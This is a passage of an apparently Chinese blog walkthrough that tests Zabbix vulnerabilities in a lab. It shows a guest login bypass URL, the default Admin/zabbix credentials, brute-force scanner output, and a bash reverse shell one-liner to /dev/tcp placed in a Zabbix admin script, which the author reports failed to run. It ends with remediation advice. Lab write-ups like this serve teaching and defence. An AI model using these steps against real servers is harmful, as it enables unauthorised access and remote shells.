string\">\"https://www.exploit-db.com/exploits/47467\"</span><span class=\"token punctuation\">]</span>\n</code></pre>\n<h3><a id=\"links_301\"></a>参看links（参考链接）</h3>\n<p><img alt=\"在这里插入图片描述\" src=\"image\\1dc11b8dc50e4dd984b22e4519783326.png\"/></p>\n<blockquote>\n<p>发现是登陆绕过</p>\n</blockquote>\n<h3><a id=\"POC_305\"></a>使用POC绕过登录</h3>\n<pre><code class=\"prism language-bash\">http://192.168.13.131:8080/zabbix.php?action<span class=\"token operator\">=</span>dashboard.view<span class=\"token operator\">&amp;</span><span class=\"token assign-left variable\">dashboardid</span><span class=\"token operator\">=</span><span class=\"token number\">1</span>\n</code></pre>\n<p><img alt=\"在这里插入图片描述\" src=\"image\\f0e0342f0cd841399ca059a262127cc5.png\"/></p>\n<h2><a id=\"5_312\"></a>5.存在默认密码</h2>\n<pre><code class=\"prism language-bash\"><span class=\"token punctuation\">[</span>Vuln: phantasm<span class=\"token punctuation\">]</span>\nTarget           <span class=\"token string\">\"http://192.168.13.131:8080/\"</span>\nVulnType         <span class=\"token string\">\"poc-yaml-zabbix-default-password/default\"</span>\nlinks            <span class=\"token punctuation\">[</span><span class=\"token string\">\"https://www.zabbix.com/documentation/3.4/zh/manual/quickstart/login\"</span><span class=\"token punctuation\">]</span>\n</code></pre>\n<h3><a id=\"links_319\"></a>查看links（参考链接）</h3>\n<p><img alt=\"在这里插入图片描述\" src=\"image\\1f85426b42084906b42a27d9349758eb.png\"/></p>\n<blockquote>\n<p>发现默认账号密码：<br/> 默认账号Admin<br/> 默认密码为zabbix<br/> 密码经过MD5加密后为5fce1b3e34b520afeffb37ce08c7cd66</p>\n</blockquote>\n<h3><a id=\"_327\"></a>使用默认账号密码，登陆成功</h3>\n<pre><code class=\"prism language-bash\">http://192.168.13.131:8080/index.php\n</code></pre>\n<p><img alt=\"在这里插入图片描述\" src=\"image\\9159e73f482443328ee6a4e797469ad8.png\"/><br/> <img alt=\"在这里插入图片描述\" src=\"image\\e774525e3f9640909f6c3e47cb0f88e7.png\"/></p>\n<h2><a id=\"6_336\"></a>6.暴力破解漏洞</h2>\n<pre><code class=\"prism language-bash\"><span class=\"token punctuation\">[</span>Vuln: brute-force<span class=\"token punctuation\">]</span>\nTarget           <span class=\"token string\">\"http://192.168.13.131:8080/index.php\"</span>\nVulnType         <span class=\"token string\">\"form-brute/default\"</span>\nfrom_url         <span class=\"token string\">\"http://192.168.13.131:8080/\"</span>\nusername         map<span class=\"token punctuation\">[</span><span class=\"token string\">\"field\"</span><span class=\"token builtin class-name\">:</span><span class=\"token string\">\"name\"</span> <span class=\"token string\">\"value\"</span><span class=\"token builtin class-name\">:</span><span class=\"token string\">\"admin\"</span><span class=\"token punctuation\">]</span>\npassw0rd         map<span class=\"token punctuation\">[</span><span class=\"token string\">\"field\"</span><span class=\"token builtin class-name\">:</span><span class=\"token string\">\"passw0rd\"</span> <span class=\"token string\">\"value\"</span><span class=\"token builtin class-name\">:</span><span class=\"token string\">\"passw0rd01\"</span><span class=\"token punctuation\">]</span>\n由于CSDN检测不能出现passw0rd，所以这里的o我改成了0\n</code></pre>\n<p>没有防御暴力破解的措施，理论上来说是可以暴力破解账号密码的</p>\n<h1><a id=\"getshell_348\"></a>八、getshell</h1>\n<h2><a id=\"1_349\"></a>1.环境</h2>\n<blockquote>\n<p>攻击机：windows本机：192.168.13.1<br/> 靶机：kali：192.168.13.131</p>\n</blockquote>\n<h2><a id=\"2_352\"></a>2.在靶机上写入脚本</h2>\n<blockquote>\n<p>用上面管理员账户密码登入到后台（账户是Admin 密码zabbix）<br/> 登入之后点Administrator-script-creatscript，进行写入shell<br/> <img alt=\"在这里插入图片描述\" src=\"image\\c67b8060defa416c9680a6cd33b8d219.png\"/></p>\n</blockquote>\n<pre><code class=\"prism language-bash\"><span class=\"token function\">bash</span> -i <span class=\"token operator\">&gt;&amp;</span> /dev/tcp/192.168.13.1/55555 <span class=\"token operator\"><span class=\"token file-descriptor important\">0</span>&gt;</span><span class=\"token file-descriptor important\">&amp;1</span>\n</code></pre>\n<h2><a id=\"3_361\"></a>3.攻击机监听：</h2>\n<p><img alt=\"在这里插入图片描述\" src=\"image\\69828a9e290442038ae30ee026881c26.png\"/></p>\n<h2><a id=\"4_364\"></a>4.靶机连接</h2>\n<blockquote>\n<p>找触发点，找到触发点才能执行。方法很多，这里拿常用的举例。<br/> <img alt=\"在这里插入图片描述\" src=\"image\\e55456e3df494f12976dfdf3d500ef2f.png\"/></p>\n</blockquote>\n<blockquote>\n<p>浏览器跳转，提示报错信息<br/> <img alt=\"在这里插入图片描述\" src=\"image\\7b8fc3222aa1469fab711d5718cd94c5.png\"/></p>\n</blockquote>\n<h2><a id=\"5Getshell_371\"></a>5.Getshell失败</h2>\n<blockquote>\n<p>脚本一直无法执行，可能是zabbix环境存在问题<br/> 理论上来说脚本一直无法执行的，是可以getshell的<br/> 后续我会重新搭建zabbix环境进行getshell的复现，不选用vulhub环境试一下，如果可以getshell我将再出篇文章</p>\n</blockquote>\n<h1><a id=\"_376\"></a>九、漏洞修复：</h1>\n<blockquote>\n<p>禁用Guest账户，关闭无用账户。<br/> 打补丁，升级zabbix版本。</p>\n</blockquote>\n<h1><a id=\"_380\"></a>十、相应资源</h1>\n<p><a href=\"https://download.csdn.net/download/qq_51577576/86400304\">zabbix SQL注入漏洞 （CVE-2016-10134）POC</a><br/> <a href=\"https://download.csdn.net/download/qq_51577576/86400303\">原文下载</a></p>\n</div>\n<link href=\"https://csdnimg.cn/release/blogv2/dist/mdeditor/css/editerView/markdown_views-22a2fefd3b.css\" rel=\"stylesheet\"/>\n<link href=\"https://csdnimg.cn/release/blogv2/dist/mdeditor/css/style-4f8fbf9108.css\" rel=\"stylesheet\"/>\n</div>"}